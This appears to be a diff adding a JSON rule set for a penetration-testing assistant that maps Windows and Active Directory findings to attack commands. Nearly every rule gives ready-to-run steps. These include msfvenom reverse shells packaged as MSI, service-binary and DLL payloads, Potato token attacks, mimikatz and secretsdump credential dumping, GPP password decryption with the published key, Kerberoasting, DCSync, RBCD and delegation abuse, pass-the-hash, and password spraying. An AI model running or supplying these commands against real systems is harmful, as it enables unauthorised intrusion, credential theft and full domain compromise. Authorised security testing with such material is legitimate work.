+                "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f msi > shell.msi",
+                "Transfer shell.msi to target",
+                "msiexec /quiet /qn /i shell.msi"
+            ],
+            "references": ["https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#alwaysinstallelevated"]
+        }
+    },
+    {
+        "name": "SeImpersonatePrivilege - Potato Attack to SYSTEM",
+        "priority": 95,
+        "host_scope": "same_host",
+        "triggers": [
+            { "id": 1, "entity_type": "privilege_escalation", "name_match": { "type": "regex", "value": "(seimpersonateprivilege_enabled|juicypotato_vulnerable_service_user)" } }
+        ],
+        "suggestion": {
+            "description": "SeImpersonatePrivilege enabled on {trigger.1.host}: {trigger.1.attributes.description}",
+            "rationale": "SeImpersonatePrivilege (common on IIS/SQL service accounts) allows token impersonation attacks for SYSTEM access. This is one of the most reliable Windows privesc methods.",
+            "commands": [
+                "Check OS version to choose the right Potato variant:",
+                "Windows 10/Server 2016+: PrintSpoofer.exe -i -c cmd (or GodPotato.exe -cmd 'cmd /c whoami')",
+                "Windows Server 2019+: JuicyPotatoNG.exe -t * -p cmd.exe -a '/c whoami'",
+                "Older: JuicyPotato.exe -l 1337 -p cmd.exe -a '/c whoami' -t *"
+            ],
+            "references": ["https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens/index.html"]
+        }
+    },
+    {
+        "name": "Stored Credentials in Credential Manager",
+        "priority": 86,
+        "host_scope": "same_host",
+        "triggers": [
+            { "id": 1, "entity_type": "privilege_escalation", "name_match": { "type": "exact", "value": "stored_credentials_credman" } }
+        ],
+        "suggestion": {
+            "description": "Stored credentials found in Credential Manager on {trigger.1.host}: {trigger.1.attributes.description}",
+            "rationale": "Windows Credential Manager may store plaintext or DPAPI-protected credentials for services, scheduled tasks, or RDP sessions.",
+            "commands": [
+                "cmdkey /list (list stored credentials)",
+                "runas /savecred /user:<STORED_USER> cmd.exe (use stored creds to run as that user)",
+                "mimikatz: vault::cred /patch (extract vault credentials)"
+            ]
+        }
+    },
+    {
+        "name": "GPP Passwords Found - Recover Plaintext Credentials",
+        "priority": 92,
+        "host_scope": "same_host",
+        "triggers": [
+            { "id": 1, "entity_type": "privilege_escalation", "name_match": { "type": "exact", "value": "group_policy_preferences_password_found" } }
+        ],
+        "suggestion": {
+            "description": "Group Policy Preferences password on {trigger.1.host}: {trigger.1.attributes.description}",
+            "rationale": "GPP passwords use a known AES key (published by Microsoft) and can be decrypted instantly. These are often local admin passwords.",
+            "commands": [
+                "gpp-decrypt '<CPASSWORD_VALUE>'",
+                "Or: python3 -c \"from Cryptodome.Cipher import AES; import base64; print(AES.new(bytes.fromhex('4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b'), AES.MODE_CBC, b'\\x00'*16).decrypt(base64.b64decode('<CPASSWORD>')))\"",
+                "Use recovered password with crackmapexec or runas"
+            ]
+        }
+    },
+    {
+        "name": "Writable Service Binary - Replace with Shell",
+        "priority": 91,
+        "host_scope": "same_host",
+        "triggers": [
+            { "id": 1, "entity_type": "privilege_escalation", "name_match": { "type": "exact", "value": "writable_service_binary" } }
+        ],
+        "suggestion": {
+            "description": "Writable service binary on {trigger.1.host}: {trigger.1.attributes.description}",
+            "rationale": "If you can replace a service binary, the service will execute your payload when restarted (often as SYSTEM).",
+            "commands": [
+                "Backup original: copy <SERVICE_BINARY> <SERVICE_BINARY>.bak",
+                "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f exe > <SERVICE_BINARY>",
+                "sc stop <SERVICE> && sc start <SERVICE>",
+                "If no restart perms: wait for reboot"
+            ]
+        }
+    },
+    {
+        "name": "DLL Hijacking Opportunity",
+        "priority": 85,
+        "host_scope": "same_host",
+        "triggers": [
+            { "id": 1, "entity_type": "privilege_escalation", "name_match": { "type": "exact", "value": "dll_hijacking_opportunity" } }
+        ],
+        "suggestion": {
+            "description": "DLL hijacking opportunity on {trigger.1.host}: {trigger.1.attributes.description}",
+            "rationale": "A service or application searches for a DLL in a writable directory. Place a malicious DLL there to execute code as the service user.",
+            "commands": [
+                "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f dll > hijack.dll",
+                "Place hijack.dll in the writable search path with the expected DLL name",
+                "Restart the service or wait for the application to load the DLL"
+            ]
+        }
+    },
+    {
+        "name": "Unattended Install File - Recover Credentials",
+        "priority": 80,
+        "host_scope": "same_host",
+        "triggers": [
+            { "id": 1, "entity_type": "privilege_escalation", "name_match": { "type": "exact", "value": "unattended_install_file_found" } }
+        ],
+        "suggestion": {
+            "description": "Unattended install file on {trigger.1.host}: {trigger.1.attributes.description}",
+            "rationale": "Unattend.xml and sysprep files often contain plaintext or base64-encoded admin passwords from initial system setup.",
+            "commands": [
+                "Search: C:\\unattend.xml, C:\\Windows\\Panther\\unattend.xml, C:\\Windows\\system32\\sysprep\\unattend.xml",
+                "Look for <AutoLogon> and <UserAccounts> sections with <Password> elements",
+                "Decode base64 passwords: echo '<BASE64>' | base64 -d"
+            ]
+        }
+    },
+    {
+        "name": "Password Not Required Flag - Try Empty Password",
+        "priority": 79,
+        "host_scope": "same_host",
+        "triggers": [
+            { "id": 1, "entity_type": "misconfiguration", "name_match": { "type": "exact", "value": "password_not_required_flag" } }
+        ],
+        "suggestion": {
+            "description": "User '{trigger.1.attributes.user}' has PASSWD_NOTREQD flag on {trigger.1.host}.",
+            "rationale": "The PASSWD_NOTREQD flag means the account can have an empty password. Try authenticating with a blank password.",
+            "commands": [
+                "crackmapexec smb {trigger.1.host} -u '{trigger.1.attributes.user}' -p ''",
+                "smbclient -L //{trigger.1.host}/ -U '{trigger.1.attributes.user}%'",
+                "rpcclient -U '{trigger.1.attributes.user}%' {trigger.1.host}"
+            ]
+        }
+    },
+
+    {
+        "_comment": "=== ACTIVE DIRECTORY ATTACKS ===",
+        "name": "Kerberoastable User - Crack Service Account",
+        "priority": 88,
+        "host_scope": "same_host",
+        "triggers": [
+            { "id": 1, "entity_type": "privilege_escalation", "name_match": { "type": "exact", "value": "kerberoastable_user" } }
+        ],
+        "suggestion": {
+            "description": "User '{trigger.1.attributes.user}' is Kerberoastable on {trigger.1.host}.",
+            "rationale": "Service accounts with SPNs have TGS tickets encrypted with their password hash. Request and crack offline.",
+            "commands": [
+                "impacket-GetUserSPNs '{trigger.1.host}/<USER>:<PASS>' -dc-ip <DC_IP> -request -outputfile kerb_hashes.txt",
+                "hashcat -m 13100 kerb_hashes.txt /usr/share/wordlists/rockyou.txt",
+                "john --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5tgs kerb_hashes.txt"
+            ],
+            "references": ["https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/kerberoast.html"]
+        }
+    },
+    {
+        "name": "AS-REP Roastable User - Crack Without Pre-Auth",
+        "priority": 88,
+        "host_scope": "same_host",
+        "triggers": [
+            { "id": 1, "entity_type": "privilege_escalation", "name_match": { "type": "regex", "value": "asreproastable_user(_hash_found)?" } }
+        ],
+        "suggestion": {
+            "description": "User '{trigger.1.attributes.user}' is AS-REP roastable on {trigger.1.host}.",
+            "rationale": "Accounts without pre-authentication return hashes that can be cracked offline. No credentials needed to request.",
+            "commands": [
+                "impacket-GetNPUsers '{trigger.1.host}/' -usersfile users.txt -dc-ip <DC_IP> -format hashcat -outputfile asrep.txt",
+                "hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt",
+                "john --wordlist=/usr/share/wordlists/rockyou.txt asrep.txt"
+            ],
+            "references": ["https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/asreproast.html"]
+        }
+    },
+    {
+        "name": "DCSync Rights - Dump All Domain Hashes",
+        "priority": 97,
+        "host_scope": "same_host",
+        "triggers": [
+            { "id": 1, "entity_type": "privilege_escalation", "name_match": { "type": "exact", "value": "dcsync_rights_found" } }
+        ],
+        "suggestion": {
+            "description": "'{trigger.1.attributes.user}' has DCSync rights on {trigger.1.host}. Full domain compromise possible.",
+            "rationale": "DCSync replicates all password hashes from the DC. If you own this principal, you own the domain.",
+            "commands": [
+                "impacket-secretsdump '{trigger.1.host}/{trigger.1.attributes.user}:<PASS>@<DC_IP>' -just-dc-ntlm",
+                "mimikatz: lsadump::dcsync /domain:{trigger.1.host} /all /csv",
+                "Pass-the-Hash as Administrator: impacket-psexec -hashes :<NT_HASH> {trigger.1.host}/Administrator@<DC_IP>"
+            ],
+            "references": ["https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/dcsync.html"]
+        }
+    },
+    {
+        "name": "GenericWrite/GenericAll on High-Value Group",
+        "priority": 93,
+        "host_scope": "same_host",
+        "triggers": [
+            { "id": 1, "entity_type": "privilege_escalation", "name_match": { "type": "exact", "value": "genericwrite_on_sensitive_group" } }
+        ],
+        "suggestion": {
+            "description": "'{trigger.1.attributes.attacker}' has write access to '{trigger.1.attributes.target}' on {trigger.1.host}.",
+            "rationale": "GenericWrite/GenericAll on a high-value group (Domain Admins, Enterprise Admins) allows adding yourself as a member for instant domain admin.",
+            "commands": [
+                "net group '{trigger.1.attributes.target}' <YOUR_USER> /add /domain",
+                "Or PowerView: Add-DomainGroupMember -Identity '{trigger.1.attributes.target}' -Members '<YOUR_USER>'",
+                "Or bloodyAD: bloodyAD -d {trigger.1.host} --host <DC_IP> add groupMember '{trigger.1.attributes.target}' '<YOUR_USER>'"
+            ],
+            "references": ["https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/acl-persistence-abuse/index.html"]
+        }
+    },
+    {
+        "name": "ACL Abuse Right - ForceChangePassword / WriteDacl / WriteOwner",
+        "priority": 89,
+        "host_scope": "same_host",
+        "triggers": [
+            { "id": 1, "entity_type": "privilege_escalation", "name_match": { "type": "exact", "value": "acl_abuse_right_on_object" } }
+        ],
+        "suggestion": {
+            "description": "'{trigger.1.attributes.attacker}' has '{trigger.1.attributes.right}' on '{trigger.1.attributes.target}' in {trigger.1.host}.",
+            "rationale": "ACL abuse rights enable lateral movement and privilege escalation in AD. Each right has a specific exploitation technique.",
+            "commands": [
+                "If ForceChangePassword: net rpc password '{trigger.1.attributes.target}' 'NewP@ss123' -U '{trigger.1.attributes.attacker}' -S <DC_IP>",
+                "If WriteDacl: Grant yourself GenericAll, then add to Domain Admins",
+                "If WriteOwner: Take ownership, then grant yourself full control",
+                "If AddMember: Add yourself to the target group directly",
+                "If GenericAll on user: Set SPN for Kerberoasting, or reset password"
+            ],
+            "references": ["https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/acl-persistence-abuse/index.html"]
+        }
+    },
+    {
+        "name": "Unconstrained Delegation - Coerce DC Authentication",
+        "priority": 90,
+        "host_scope": "same_host",
+        "triggers": [
+            { "id": 1, "entity_type": "privilege_escalation", "name_match": { "type": "exact", "value": "unconstrained_delegation_enabled" } }
+        ],
+        "suggestion": {
+            "description": "'{trigger.1.attributes.computer}' has Unconstrained Delegation on {trigger.1.host}.",
+            "rationale": "Coerce a DC to authenticate to this machine to capture its TGT. This leads to full domain compromise.",
+            "commands": [
+                "If admin on computer: Rubeus.exe monitor /interval:1 /nowrap",
+                "Coerce: python3 PetitPotam.py <LISTENER_IP> <DC_IP>",
+                "Coerce: python3 printerbug.py {trigger.1.host}/<USER>:<PASS>@<DC_IP> <LISTENER_IP>",
+                "Import TGT: Rubeus.exe ptt /ticket:<BASE64>",
+                "Then DCSync: mimikatz lsadump::dcsync /domain:{trigger.1.host} /all"
+            ],
+            "references": ["https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/unconstrained-delegation.html"]
+        }
+    },
+    {
+        "name": "Resource-Based Constrained Delegation (RBCD) Abuse",
+        "priority": 87,
+        "host_scope": "same_host",
+        "triggers": [
+            { "id": 1, "entity_type": "privilege_escalation", "name_match": { "type": "exact", "value": "resource_based_constrained_delegation_possible" } }
+        ],
+        "suggestion": {
+            "description": "RBCD abuse possible on '{trigger.1.attributes.computer}' in {trigger.1.host}.",
+            "rationale": "If you can write to msDS-AllowedToActOnBehalfOfOtherIdentity, you can impersonate any user to this computer's services.",
+            "commands": [
+                "Create/use a machine account you control",
+                "impacket-addcomputer '{trigger.1.host}/<USER>:<PASS>' -computer-name 'EVIL$' -computer-pass 'Password123'",
+                "Configure RBCD: impacket-rbcd '{trigger.1.host}/<USER>:<PASS>' -delegate-from 'EVIL$' -delegate-to '{trigger.1.attributes.computer}' -action write",
+                "Get ticket: impacket-getST '{trigger.1.host}/EVIL$:Password123' -spn cifs/{trigger.1.attributes.computer} -impersonate Administrator",
+                "export KRB5CCNAME=Administrator.ccache && impacket-psexec -k -no-pass {trigger.1.attributes.computer}"
+            ],
+            "references": ["https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/resource-based-constrained-delegation.html"]
+        }
+    },
+    {
+        "name": "Privileged User Session on Computer - Credential Theft Target",
+        "priority": 86,
+        "host_scope": "same_host",
+        "triggers": [
+            { "id": 1, "entity_type": "privilege_escalation", "name_match": { "type": "exact", "value": "privileged_user_session_found" } }
+        ],
+        "suggestion": {
+            "description": "High-privilege user '{trigger.1.attributes.user}' has a session on '{trigger.1.attributes.computer}' in {trigger.1.host}.",
+            "rationale": "If you can gain admin on this computer, you can dump credentials or tokens for the privileged user and pivot to domain admin.",
+            "commands": [
+                "Target '{trigger.1.attributes.computer}' for exploitation",
+                "If admin on computer: mimikatz sekurlsa::logonpasswords (dump credentials from memory)",
+                "Or: Rubeus.exe dump /nowrap (extract Kerberos tickets)",
+                "Use captured credentials/tickets to authenticate as '{trigger.1.attributes.user}'"
+            ]
+        }
+    },
+    {
+        "name": "High-Privilege Admin User Identified",
+        "priority": 80,
+        "host_scope": "same_host",
+        "triggers": [
+            { "id": 1, "entity_type": "privilege_escalation", "name_match": { "type": "exact", "value": "attractive_user_high_privileges" } }
+        ],
+        "suggestion": {
+            "description": "User '{trigger.1.attributes.user}' has AdminCount=true on {trigger.1.host}. This is a high-value target.",
+            "rationale": "Users with AdminCount=true have (or had) elevated privileges. Compromising this account likely leads to domain admin.",
+            "commands": [
+                "Try Kerberoasting if this user has an SPN",
+                "Check for AS-REP roastable flag",
+                "Check for ACL abuse paths that lead to this user",
+                "Target computers where this user has active sessions"
+            ]
+        }
+    },
+    {
+        "name": "Kerbrute Users + Kerberos Service - Spray Attack",
+        "priority": 82,
+        "host_scope": "same_host",
+        "triggers": [
+            { "id": 1, "entity_type": "user", "name_match": { "type": "regex", "value": ".*" } },
+            { "id": 2, "entity_type": "misconfiguration", "name_match": { "type": "exact", "value": "password_policy_details" } }
+        ],
+        "suggestion": {
+            "description": "User '{trigger.1.name}' found on host with password policy details. Spray based on policy.",
+            "rationale": "Password policy details reveal minimum length and complexity requirements. Craft a spray list that respects these constraints to avoid lockouts.",
+            "commands": [
+                "Review password policy: minimum length, complexity, lockout threshold",
+                "crackmapexec smb {trigger.1.host} -u users.txt -p 'Password1' --continue-on-success",
+                "crackmapexec smb {trigger.1.host} -u users.txt -p 'Welcome1' --continue-on-success",
+                "Spray one password at a time, wait for lockout window between attempts"
+            ]
+        }
+    }
+]
